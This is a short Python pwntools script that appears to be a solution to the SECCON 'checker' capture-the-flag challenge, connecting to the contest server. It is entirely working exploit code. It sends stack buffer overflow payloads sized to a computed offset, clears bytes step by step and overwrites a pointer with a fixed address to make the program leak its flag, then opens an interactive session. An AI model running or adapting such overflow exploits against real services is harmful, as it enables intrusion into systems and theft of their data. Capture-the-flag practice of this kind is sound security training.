from pwn import *

# p = process('./checker')
p = remote('checker.pwn.seccon.jp', 14726)

p.recvuntil('NAME : ')
p.sendline('a')

base = 'A' * (0x7fffffffe598 - 0x7fffffffe420)
for i in xrange(5):
	payload = base + 'A' * (0x7 - i)
	p.recvuntil('>> ')
	p.sendline(payload)

payload = base + p64(0x6010c0)
p.recvuntil('>> ')
p.sendline(payload)

p.recvuntil('>> ')
p.sendline('yes')

p.recvuntil('FLAG : ')
p.sendline('k')

p.interactive()


